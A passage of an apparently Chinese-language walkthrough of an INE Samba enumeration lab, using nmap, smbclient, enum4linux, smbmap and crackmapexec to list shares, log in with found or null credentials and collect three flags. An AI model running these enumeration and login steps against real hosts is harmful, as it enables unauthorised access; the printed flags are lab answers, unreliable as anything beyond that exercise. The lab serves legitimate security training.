  ..                                  D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135618020 blocks available
```

```
smbclient //192.253.162.3/elliot -U elliot --password xbox360
```

```
root@INE:~# smbclient //192.253.162.3/elliot -U elliot --password xbox360
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:40 2021
  tests                               D        0  Tue Nov 16 20:35:43 2021
  code                                D        0  Tue Nov 16 20:35:43 2021
  docs                                D        0  Tue Nov 16 20:35:43 2021
  api-specs                           D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135597704 blocks available
smb: \> cd tests\
smb: \tests\> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135597700 blocks available
smb: \tests\> cd ..
smb: \> cd code\
smb: \code\> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135666240 blocks available
smb: \code\> cd ..
smb: \> cd docs\
smb: \docs\> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135803356 blocks available
smb: \docs\> cd ..
smb: \> cd api-specs\
smb: \api-specs\> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135803160 blocks available
```

```
smbclient //192.253.162.3/admin -U admin --password adminpasswd
```

```
root@INE:~# smbclient //192.253.162.3/admin -U admin --password adminpasswd
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
```

参考：[NT_STATUS_BAD_NETWORK_NAME 在 Samba 中是什么意思？](https://serverfault.com/questions/137135/what-does-nt-status-bad-network-name-mean-in-samba)

我记得有这样一个问题。我认为这是由于路径中某处的目录权限丢失读取造成的。检查路径的目录权限为 755。

如果路径不存在，也会返回此错误。

检查路径权限，发现admin路径没有读取权限。

```
root@INE:~# crackmapexec smb 192.253.162.3 -u 'admin' -p 'adminpasswd' --shares
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [*] Windows 6.1 Build 0 (name:EVILCORP-SMB-SHARES) (domain:ine.local) (signing:False) (SMBv1:False)
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [+] ine.local\admin:adminpasswd 
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES [+] Enumerated shares
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES Share           Permissions     Remark
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES -----           -----------     ------
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES public          READ,WRITE      This is a publically accessible share.
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES ecorp           READ            
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES william         READ            
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES elliot          READ,WRITE      
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES admin                           
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES share$                          
SMB         192.253.162.3   445    EVILCORP-SMB-SHARES IPC$                            IPC Service (evilcorp.smb.shares)
```

现在，还没有访问过的共享有：

```
        ecorp           Disk   
        admin           Disk
        share$          Disk 
```

可以尝试用`admin:adminpasswd`来读取ecorp共享。

```
smbclient //192.253.162.3/ecorp -U admin --password adminpasswd
```

```
root@INE:~# smbclient //192.253.162.3/ecorp -U admin --password adminpasswd
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Nov 16 20:35:40 2021
  ..                                  D        0  Tue Nov 16 20:35:40 2021

                1981094964 blocks of size 1024. 135257160 blocks available
```

现在，还没有访问过的共享有：

```
        admin           Disk
        share$          Disk 
```

记得之前枚举过，存在共享shadow1，允许空会话。

```
shadow1 EXISTS, Allows access using username: '', password: ''
```

```
smbclient //192.253.162.3/shadow1 -U "" -N
```

```
root@INE:~# smbclient //192.253.162.3/shadow1 -U "" -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:40 2021
  flag_3                              N       33  Tue Nov 16 20:35:43 2021
  services                            D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135597988 blocks available
smb: \> cd services\
smb: \services\> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135583088 blocks available
smb: \services\> cd ..
smb: \> get flag_3
getting file \flag_3 of size 33 as flag_3 (16.1 KiloBytes/sec) (average 16.1 KiloBytes/sec)
```

```
root@INE:~# cat flag_3 
YrcxI1WVRN9gmIO4jJINdjSfOMf5SKsG
```

枚举出共享michael，允许空会话。

```
enum4linux -s /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt demo.ine.local
```

```
 ======================================================= 
|    Brute Force Share Enumeration on demo.ine.local    |
 ======================================================= 
michael EXISTS, Allows access using username: '', password: ''
```

查看enum4linux的结果，确实枚举出了michael用户，被我忽略了。

```
 =============================== 
|    Users on demo.ine.local    |
 =============================== 
user:[ecorp] rid:[0x3e8]
user:[william] rid:[0x3ea]
user:[raymond] rid:[0x3ec]
user:[michael] rid:[0x3e9]
user:[elliot] rid:[0x3eb]
user:[admin] rid:[0x3ed]
```

```
smbclient //192.253.162.3/michael -U "" -N
```

```
root@INE:~# smbclient //192.253.162.3/michael -U "" -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:40 2021
  dir                                 D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135482680 blocks available
smb: \> cd dir\
smb: \dir\> ls
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021
  folder41                            D        0  Tue Nov 16 20:35:43 2021
  folder33                            D        0  Tue Nov 16 20:35:43 2021
  folder92                            D        0  Tue Nov 16 20:35:43 2021
  folder50                            D        0  Tue Nov 16 20:35:43 2021
  folder77                            D        0  Tue Nov 16 20:35:43 2021
  folder43                            D        0  Tue Nov 16 20:35:43 2021
  folder48                            D        0  Tue Nov 16 20:35:43 2021
  folder76                            D        0  Tue Nov 16 20:35:43 2021
  folder18                            D        0  Tue Nov 16 20:35:43 2021
  folder99                            D        0  Tue Nov 16 20:35:43 2021
  folder100                           D        0  Tue Nov 16 20:35:43 2021
  folder64                            D        0  Tue Nov 16 20:35:43 2021
  folder56                            D        0  Tue Nov 16 20:35:43 2021
  folder52                            D        0  Tue Nov 16 20:35:43 2021
  folder66                            D        0  Tue Nov 16 20:35:43 2021
  folder60                            D        0  Tue Nov 16 20:35:43 2021
  folder79                            D        0  Tue Nov 16 20:35:43 2021
  folder45                            D        0  Tue Nov 16 20:35:43 2021
  folder82                            D        0  Tue Nov 16 20:35:43 2021
  folder37                            D        0  Tue Nov 16 20:35:43 2021
  folder4                             D        0  Tue Nov 16 20:35:43 2021
  folder81                            D        0  Tue Nov 16 20:35:43 2021
  folder16                            D        0  Tue Nov 16 20:35:43 2021
  folder67                            D        0  Tue Nov 16 20:35:43 2021
  folder83                            D        0  Tue Nov 16 20:35:43 2021
  folder7                             D        0  Tue Nov 16 20:35:43 2021
  folder2                             D        0  Tue Nov 16 20:35:43 2021
  folder85                            D        0  Tue Nov 16 20:35:43 2021
  folder93                            D        0  Tue Nov 16 20:35:43 2021
  folder90                            D        0  Tue Nov 16 20:35:43 2021
  folder42                            D        0  Tue Nov 16 20:35:43 2021
  folder17                            D        0  Tue Nov 16 20:35:43 2021
  folder87                            D        0  Tue Nov 16 20:35:43 2021
  folder80                            D        0  Tue Nov 16 20:35:43 2021
  folder91                            D        0  Tue Nov 16 20:35:43 2021
  folder24                            D        0  Tue Nov 16 20:35:43 2021
  folder25                            D        0  Tue Nov 16 20:35:43 2021
  folder39                            D        0  Tue Nov 16 20:35:43 2021
  folder26                            D        0  Tue Nov 16 20:35:43 2021
  folder86                            D        0  Tue Nov 16 20:35:43 2021
  folder1                             D        0  Tue Nov 16 20:35:43 2021
  folder46                            D        0  Tue Nov 16 20:35:43 2021
  folder94                            D        0  Tue Nov 16 20:35:43 2021
  folder62                            D        0  Tue Nov 16 20:35:43 2021
  folder34                            D        0  Tue Nov 16 20:35:43 2021
  folder70                            D        0  Tue Nov 16 20:35:43 2021
  folder6                             D        0  Tue Nov 16 20:35:43 2021
  folder15                            D        0  Tue Nov 16 20:35:43 2021
  folder72                            D        0  Tue Nov 16 20:35:43 2021
  folder29                            D        0  Tue Nov 16 20:35:43 2021
  folder19                            D        0  Tue Nov 16 20:35:43 2021
  folder44                            D        0  Tue Nov 16 20:35:43 2021
  folder63                            D        0  Tue Nov 16 20:35:43 2021
  folder10                            D        0  Tue Nov 16 20:35:43 2021
  folder65                            D        0  Tue Nov 16 20:35:43 2021
  folder20                            D        0  Tue Nov 16 20:35:43 2021
  folder9                             D        0  Tue Nov 16 20:35:43 2021
  folder36                            D        0  Tue Nov 16 20:35:43 2021
  folder78                            D        0  Tue Nov 16 20:35:43 2021
  folder69                            D        0  Tue Nov 16 20:35:43 2021
  folder38                            D        0  Tue Nov 16 20:35:43 2021
  folder98                            D        0  Tue Nov 16 20:35:43 2021
  folder68                            D        0  Tue Nov 16 20:35:43 2021
  folder55                            D        0  Tue Nov 16 20:35:43 2021
  folder22                            D        0  Tue Nov 16 20:35:43 2021
  folder47                            D        0  Tue Nov 16 20:35:43 2021
  folder13                            D        0  Tue Nov 16 20:35:43 2021
  folder74                            D        0  Tue Nov 16 20:35:43 2021
  folder54                            D        0  Tue Nov 16 20:35:43 2021
  folder88                            D        0  Tue Nov 16 20:35:43 2021
  folder30                            D        0  Tue Nov 16 20:35:43 2021
  folder31                            D        0  Tue Nov 16 20:35:43 2021
  folder8                             D        0  Tue Nov 16 20:35:43 2021
  folder53                            D        0  Tue Nov 16 20:35:43 2021
  folder21                            D        0  Tue Nov 16 20:35:43 2021
  folder59                            D        0  Tue Nov 16 20:35:43 2021
  folder58                            D        0  Tue Nov 16 20:35:43 2021
  folder84                            D        0  Tue Nov 16 20:35:43 2021
  folder75                            D        0  Tue Nov 16 20:35:43 2021
  folder49                            D        0  Tue Nov 16 20:35:43 2021
  folder27                            D        0  Tue Nov 16 20:35:43 2021
  folder11                            D        0  Tue Nov 16 20:35:43 2021
  folder5                             D        0  Tue Nov 16 20:35:43 2021
  folder71                            D        0  Tue Nov 16 20:35:43 2021
  flag_2                              D        0  Tue Nov 16 20:35:43 2021
  folder96                            D        0  Tue Nov 16 20:35:43 2021
  folder40                            D        0  Tue Nov 16 20:35:43 2021
  folder3                             D        0  Tue Nov 16 20:35:43 2021
  folder28                            D        0  Tue Nov 16 20:35:43 2021
  folder97                            D        0  Tue Nov 16 20:35:43 2021
  folder57                            D        0  Tue Nov 16 20:35:43 2021
  folder73                            D        0  Tue Nov 16 20:35:43 2021
  folder14                            D        0  Tue Nov 16 20:35:43 2021
  folder12                            D        0  Tue Nov 16 20:35:43 2021
  folder23                            D        0  Tue Nov 16 20:35:43 2021
  folder95                            D        0  Tue Nov 16 20:35:43 2021
  folder51                            D        0  Tue Nov 16 20:35:43 2021
  folder32                            D        0  Tue Nov 16 20:35:43 2021
  folder35                            D        0  Tue Nov 16 20:35:43 2021
  folder61                            D        0  Tue Nov 16 20:35:43 2021
  folder89                            D        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135482680 blocks available
smb: \dir\> cd flag_2\
smb: \dir\flag_2\> ls
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021
  -                                   N       33  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 135482660 blocks available
smb: \dir\flag_2\> get -
jtiz1hI467CrRgPDeuDo4u1fCAdMsQFs
getting file \dir\flag_2\- of size 33 as - (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
```

至此，我们找到了所有的flag。

```
flag_1: HgQQZGOH0twJLImZ1uWMHvRxETuw8kIC
flag_2: jtiz1hI467CrRgPDeuDo4u1fCAdMsQFs
flag_3: YrcxI1WVRN9gmIO4jJINdjSfOMf5SKsG
```

## 解决方案
第 1 步：打开实验室链接以访问 Kali GUI 实例。

第二步：使用Nmap扫描目标机器。

命令：

```
nmap -sS -sV demo.ine.local
```

```
root@INE:~# nmap -sS -sV demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 19:18 IST
Nmap scan report for demo.ine.local (192.154.191.3)
Host is up (0.0000090s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:C0:9A:BF:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```

我们可以清楚地看到smbd服务正在目标机器上的（TCP）端口 139 和 445 上运行。另外，smbd服务的版本是4.6.2。

第 3 步：使用 Nmap 执行 UDP 扫描以确定nmbd服务的状态。

命令：

```
nmap -sU --top-ports 25 demo.ine.local
```

```
root@INE:~# nmap -sU --top-ports 25 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 19:21 IST
Nmap scan report for demo.ine.local (192.154.191.3)
Host is up (0.000073s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
111/udp   closed        rpcbind
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   open          netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
998/udp   closed        puparp
1434/udp  closed     ms-sql-m                                                                                                                                                            
1701/udp  closed        L2TP                                                                                                                                                                
1900/udp  closed        upnp                                                                                                                                                                
4500/udp  closed        nat-t-ike                                                                                                                                                           
5353/udp  closed        zeroconf                                                                                                                                                            
49152/udp closed        unknown
49154/udp closed        unknown
MAC Address: 02:42:C0:9A:BF:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 24.35 seconds
```

nmbd使用的默认 (UDP) 端口是 137 和 138。如果您注意到上面的输出，目标机器上的 UDP 端口 137 是打开的！

以下命令将确认nmbd服务正在目标机器上运行：

命令：

```
nmap -sU -sV -p137 demo.ine.local
nmap -sU -sV -p138 demo.ine.local
```

```
root@INE:~# nmap -sU -sV -p137 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 19:28 IST
Nmap scan report for demo.ine.local (192.154.191.3)
Host is up (0.00013s latency).

PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: EVILCORP-SMB-SH)
MAC Address: 02:42:C0:9A:BF:03 (Unknown)
Service Info: Host: EVILCORP

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
root@INE:~# nmap -sU -sV -p138 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 19:29 IST
Nmap scan report for demo.ine.local (192.154.191.3)
Host is up (0.000043s latency).

PORT    STATE         SERVICE     VERSION
138/udp open|filtered netbios-dgm
MAC Address: 02:42:C0:9A:BF:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.39 seconds
```

输出表明nmbd服务正在（UDP）端口 137 上运行。对于端口 138，没有响应，因此，Nmap 无法知道该端口是否真的打开。

信息：当 Nmap 无法确定端口是打开还是过滤时，Nmap 会将端口置于“`open|filtered`”状态。这发生在开放端口没有响应的扫描类型中。没有响应也可能意味着数据包过滤器丢弃了探测。

第 4 步：使用smbclient实用程序列出目标 samba 服务器上的所有可用共享。

使用以下命令列出目标 samba 服务器上的所有共享。

`-L` flag 用于列出共享

`-N` flag 用于抑制密码提示

命令：

```
smbclient -L demo.ine.local -N
```

```
root@INE:~# smbclient -L demo.ine.local -N

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      This is a publically accessible share.
        ecorp           Disk      
        william         Disk      
        elliot          Disk      
        admin           Disk      
        share$          Disk      
        IPC$            IPC       IPC Service (evilcorp.smb.shares)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

输出显示可用* 共享列表。

* 注意：上面的输出实际上只显示了可浏览的共享列表，而不是可用的共享。某些共享可能未设置为可浏览，因此 smbclient 未列出。

如果您想知道哪个密码提示确实`-N`省略了标志，请尝试删除标志并再次运行命令：

命令：

```
smbclient -L demo.ine.local
```

```
root@INE:~# smbclient -L demo.ine.local
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      This is a publically accessible share.
        ecorp           Disk      
        william         Disk      
        elliot          Disk      
        admin           Disk      
        share$          Disk      
        IPC$            IPC       IPC Service (evilcorp.smb.shares)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

```

请注意，这一次收到了输入当前用户（即root ）密码的提示。

因此，使用该`-N`标志，密码提示将被忽略，并且不使用密码。

使用nmblookup实用程序检查目标机器上的文件共享服务是否可用：

命令：

```
nmblookup -A demo.ine.local
```

```
root@INE:~# nmblookup -A demo.ine.local
Looking up status of 192.154.191.3
        EVILCORP        <00> - <GROUP> H <ACTIVE> 
        EVILCORP        <1e> - <GROUP> H <ACTIVE> 
        EVILCORP-SMB-SH <00> -         H <ACTIVE> 
        EVILCORP-SMB-SH <03> -         H <ACTIVE> 
        EVILCORP-SMB-SH <20> -         H <ACTIVE> 

        MAC Address = 00-00-00-00-00-00

```

请注意，针对EVILCORP`<20>`smb 共享的输出中的表明该节点正在运行 SMB 文件服务器！

同样可以使用enum4linux工具进行验证：

命令：

```
enum4linux -a demo.ine.local
```

```
root@INE:~# enum4linux -a demo.ine.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul 21 19:40:48 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on demo.ine.local    |
 ====================================================== 
[+] Got domain/workgroup name: EVILCORP

 ============================================== 
|    Nbtstat Information for demo.ine.local    |
 ============================================== 
Looking up status of 192.154.191.3
        EVILCORP        <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        EVILCORP        <1e> - <GROUP> H <ACTIVE>  Browser Service Elections
        EVILCORP-SMB-SH <00> -         H <ACTIVE>  Workstation Service
        EVILCORP-SMB-SH <03> -         H <ACTIVE>  Messenger Service
        EVILCORP-SMB-SH <20> -         H <ACTIVE>  File Server Service

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on demo.ine.local    |
 ======================================= 
[+] Server demo.ine.local allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for demo.ine.local    |
 ============================================= 
Domain Name: EVILCORP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on demo.ine.local    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for demo.ine.local from smbclient: 
[+] Got OS info for demo.ine.local from srvinfo:
        EVILCORP-SMB-SHWk Sv PrQ Unx NT SNT evilcorp.smb.shares
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =============================== 
|    Users on demo.ine.local    |
 =============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: ecorp    Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: william  Name:   Desc: 
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: raymond  Name:   Desc: 
index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: michael  Name:   Desc: 
index: 0x5 RID: 0x3eb acb: 0x00000010 Account: elliot   Name:   Desc: 
index: 0x6 RID: 0x3ed acb: 0x00000010 Account: admin    Name:   Desc: 

user:[ecorp] rid:[0x3e8]
user:[william] rid:[0x3ea]
user:[raymond] rid:[0x3ec]
user:[michael] rid:[0x3e9]
user:[elliot] rid:[0x3eb]
user:[admin] rid:[0x3ed]

 =========================================== 
|    Share Enumeration on demo.ine.local    |
 =========================================== 
smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      This is a publically accessible share.
        ecorp           Disk      
        william         Disk      
        elliot          Disk      
        admin           Disk      
        share$          Disk      
        IPC$            IPC       IPC Service (evilcorp.smb.shares)
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on demo.ine.local
//demo.ine.local/public Mapping: OK, Listing: OK
//demo.ine.local/ecorp  Mapping: DENIED, Listing: N/A
//demo.ine.local/william        Mapping: DENIED, Listing: N/A
//demo.ine.local/elliot Mapping: DENIED, Listing: N/A
//demo.ine.local/admin  Mapping: DENIED, Listing: N/A
//demo.ine.local/share$ Mapping: DENIED, Listing: N/A
//demo.ine.local/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ====================================================== 
|    Password Policy Information for demo.ine.local    |
 ====================================================== 


[+] Attaching to demo.ine.local using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] EVILCORP-SMB-SHARES
        [+] Builtin

[+] Password Info for Domain: EVILCORP-SMB-SHARES

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ================================ 
|    Groups on demo.ine.local    |
 ================================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:
group:[Reserved] rid:[0x3f1]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Developer] rid:[0x3ee]
group:[Guest] rid:[0x3ef]
group:[Maintainer] rid:[0x3f0]
group:[Tester] rid:[0x3f2]
group:[Admin] rid:[0x3f3]

[+] Getting domain group memberships:
Group 'Maintainer' (RID: 1008) has member: EVILCORP-SMB-SHARES\admin
Group 'Maintainer' (RID: 1008) has member: EVILCORP-SMB-SHARES\michael
Group 'Maintainer' (RID: 1008) has member: EVILCORP-SMB-SHARES\elliot
Group 'Developer' (RID: 1006) has member: EVILCORP-SMB-SHARES\admin
Group 'Developer' (RID: 1006) has member: EVILCORP-SMB-SHARES\elliot
Group 'Guest' (RID: 1007) has member: EVILCORP-SMB-SHARES\admin
Group 'Guest' (RID: 1007) has member: EVILCORP-SMB-SHARES\raymond
Group 'Tester' (RID: 1010) has member: EVILCORP-SMB-SHARES\admin
Group 'Tester' (RID: 1010) has member: EVILCORP-SMB-SHARES\william
```

同样， enum4linux工具也显示了相同的结果！

由于 SMB 文件服务器已启用并处于活动状态，我们可以访问可用共享上的文件，如果它们允许匿名访问（因为我们不知道任何可用共享的密码）。

在访问文件之前，我们需要知道不同共享的权限。接下来让我们这样做。

第 5 步：使用smbmap工具检查共享权限。

命令：

```
smbmap -H demo.ine.local
```

```
root@INE:~# smbmap -H demo.ine.local
[+] IP: demo.ine.local:445      Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        public                                                  READ, WRITE     This is a publically accessible share.
        ecorp                                                   NO ACCESS
        william                                                 NO ACCESS
        elliot                                                  NO ACCESS
        admin                                                   NO ACCESS
        share$                                                  NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (evilcorp.smb.shares)
```

在所有可浏览的共享中，public共享具有`READ, WRITE`权限。

我们也可以使用enum4linux工具来完成这个任务：

命令：

```
enum4linux -d -S demo.ine.local
```

上述命令将在共享列表 (`-S`) 上显示详细信息 (`-d`)。

```
root@INE:~# enum4linux -d -S demo.ine.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul 21 19:49:10 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on demo.ine.local    |
 ====================================================== 
[+] Got domain/workgroup name: EVILCORP

 ======================================= 
|    Session Check on demo.ine.local    |
 ======================================= 
[+] Server demo.ine.local allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for demo.ine.local    |
 ============================================= 
Domain Name: EVILCORP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =========================================== 
|    Share Enumeration on demo.ine.local    |
 =========================================== 
smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      This is a publically accessible share.
        ecorp           Disk      
        william         Disk      
        elliot          Disk      
        admin           Disk      
        share$          Disk      
        IPC$            IPC       IPC Service (evilcorp.smb.shares)
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on demo.ine.local
//demo.ine.local/public Mapping: OK, Listing: OK
//demo.ine.local/ecorp  Mapping: DENIED, Listing: N/A
//demo.ine.local/william        Mapping: DENIED, Listing: N/A
//demo.ine.local/elliot Mapping: DENIED, Listing: N/A
//demo.ine.local/admin  Mapping: DENIED, Listing: N/A
//demo.ine.local/share$ Mapping: DENIED, Listing: N/A
//demo.ine.local/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
enum4linux complete on Thu Jul 21 19:49:10 2022
```

您还可以注意到，允许使用空的用户名和密码！

输出表明，在所有可浏览共享中，只有公共共享可以被映射和访问，而其他共享则需要适当的身份验证才能被映射和访问。

第 6 步：使用smbclient实用程序连接到公共共享。

由于允许使用空凭据，让我们使用该`-N`标志并连接到公共共享：

命令：

```
smbclient //demo.ine.local/public -N
```

如您所见，连接成功，我们收到了可以与公共共享交互的提示。

```
root@INE:~# smbclient //demo.ine.local/public -N
Try "help" to get a list of possible commands.
smb: \> 
```

让我们从此共享中获取flag：

命令：

```
ls
cd .hidden\
ls
get flag_1
```

上述命令将列出公共共享中的文件，将目录更改为.hidden，列出该文件夹中的文件，然后从那里下载flag_1文件。

```
root@INE:~# smbclient //demo.ine.local/public -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:40 2021
  test                                D        0  Tue Nov 16 20:35:43 2021
  dev                                 D        0  Tue Nov 16 20:35:43 2021
  prod                                D        0  Tue Nov 16 20:35:43 2021
  .hidden                            DH        0  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 123175844 blocks available
smb: \> cd .hidden\
smb: \.hidden\> ls
  .                                   D        0  Tue Nov 16 20:35:43 2021
  ..                                  D        0  Tue Nov 16 20:35:43 2021
  flag_1                              N       33  Tue Nov 16 20:35:43 2021

                1981094964 blocks of size 1024. 123175672 blocks available
smb: \.hidden\> get flag_1
getting file \.hidden\flag_1 of size 33 as flag_1 (16.1 KiloBytes/sec) (average 16.1 KiloBytes/sec)
smb: \.hidden\> ^C
```

下载flag后，我们可以按`CTRL + C`退出 smb 会话，然后读取下载的标志：

命令：

```
cat flag_1
```
Flag 1: `HgQQZGOH0twJLImZ1uWMHvRxETuw8kIC`

我们可以使用以下命令来读取文件，而不是在本地下载文件：

命令：

```
get flag_1 -
```

注意`get`命令。

该`get`命令的第二个参数（可选）是本地系统上必须保存远程文件（正在下载）的内容的文件。

在这里，文件内容显示在标准输出上，而不是保存到本地文件中。原因是`-`被视为标准输出（标准输出）。

第 7 步：查找其中一位用户的共享。

使用enum4linux工具列出用户（使用`-U`标志）：

命令：

```
enum4linux -U demo.ine.local
```

```
root@INE:~# enum4linux -U demo.ine.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul 21 20:13:27 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on demo.ine.local    |
 ====================================================== 
[+] Got domain/workgroup name: EVILCORP

 ======================================= 
|    Session Check on demo.ine.local    |
 ======================================= 
[+] Server demo.ine.local allows sessions using username '', password ''

 ============================================= 
